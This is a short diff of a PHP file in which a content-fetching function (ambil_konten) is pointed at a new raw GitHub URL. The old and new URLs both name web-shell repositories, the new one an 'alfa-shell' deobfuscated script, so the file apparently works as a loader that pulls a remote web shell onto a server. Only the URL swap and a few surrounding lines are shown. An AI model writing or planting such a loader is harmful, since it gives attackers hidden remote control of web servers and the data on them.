@@ -56,7 +56,7 @@ function ambil_konten($url) {
     return $konten;
 }
 
-$url = "https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/main/gray.php";
+$url = "https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-deobfuscated.php";
 $konten = ambil_konten($url);
 
 if ($konten === false) {
